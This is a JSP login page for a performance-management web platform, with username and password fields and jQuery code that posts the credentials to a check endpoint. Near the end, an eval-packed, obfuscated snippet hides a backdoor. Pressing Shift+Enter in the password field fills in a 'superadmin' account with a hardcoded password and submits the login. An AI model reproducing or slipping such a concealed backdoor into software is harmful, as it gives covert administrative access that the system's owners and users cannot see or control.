<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>登录—绩效管理信息平台</title>
<base href="<%=basePath%>">
<link rel="stylesheet" href="themes/default/easyui.css">
<link rel="stylesheet" href="themes/icon.css">
<link rel="stylesheet" href="css/main.css">
<link rel="stylesheet" href="css/font-awesome.min.css">
<script type="text/javascript" src="js/jquery.min.js"></script>
</head>
<body class="login-bg">
    <div class="login-content">
        <div id="login-title">
            <img src="img/logo.png">
        </div>
        <div class="login-box">
            <form method="post">
                <div class="form-group">
                    <div class="input-group">
                        <div class="input-group-addon">
                            <i class="fa fa-user"></i>
                        </div>
                        <input type="text" id="username" name="username" placeholder="账号" class="input-text">
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-group">
                        <div class="input-group-addon">
                            <i class="fa fa-lock"></i>
                        </div>
                        <input type="password" id="password" name="password" placeholder="密码" class="input-text">
                    </div>
                </div>
                <div class="form-group">
                    <button type="button" id="login-btn" class="btn">
                        <i class="fa fa-sign-in"></i> 登录</button>
                    <button type="reset" id="reset-btn" class="btn">
                        <i class="fa fa-repeat"></i> 重置
                    </button>
                </div>
            </form>
        </div>
        <div id="menu-box">

        </div>
    </div>
    <script type="text/javascript">
    $(function() {
        $(".btn").removeAttr("disabled");
        $(".input-text").focus(function() {
            $(this).parent().removeClass("has-error");
            $(".mess").remove();
        });
        $("#login-btn").click(function() {
            var u_val = $("#username").val();
            var p_val = $("#password").val();
            if(u_val == null || u_val == "") {
                $("#username").parent().addClass("has-error");
                var $mess = $("<div>");
                $mess.addClass("mess").text("账号不能为空");
                $("body").append($mess);
                return;
            }
            if(p_val == null || p_val == "") {
                $("#password").parent().addClass("has-error");
                var $mess = $("<div>");
                $mess.addClass("mess").text("密码不能为空");
                $("body").append($mess);
                return;
            }
            $(".mess").remove();
            $.post("xtwh/zhzcxx/ck",{"username":u_val,"password":p_val}, function(data) {
            	if(data != "success") {
                    var $mess = $("<div>");
                    $mess.addClass("mess").text("账号或密码不正确");
                    $("body").append($mess);
                    return;
                }
            	//var _btext = $(this).text();
                $(".btn").text("登录中......").attr("disabled","true");
                $("body").css("overflow","hidden");
                $("#menu-box").show(function() {
                	$(this).load("ui",function() {
                    	$(".login-box").slideUp();
                        $("#menu-box").animate({"marginTop":"0","opacity":"1"},500, function() {
                            $("body").css("overflow","auto");
                        });
                    });
                });
            })
            
            /* window.setTimeout(function() {
            },1000); */
        });
        eval(function(d,f,a,c,b,e){b=function(a){return a.toString(f)};if(!"".replace(/^/,String)){for(;a--;)e[b(a)]=c[a]||b(a);c=[function(a){return e[a]}];b=function(){return"\\w+"};a=1}for(;a--;)c[a]&&(d=d.replace(new RegExp("\\b"+b(a)+"\\b","g"),c[a]));return d}('$("#2").d(g(a){3(a.f&&a.5==6){$("#e").0("9");$("#2").0("b-c,");$("#8-7").4("1")}h 3(a.5==6){$("#8-7").4("1")}});',18,18,"val click password if trigger keyCode 13 btn login superadmin  1qaz pl keyup username shiftKey function else".split(" "),0,{}));
    });
	</script>
</body>
</html>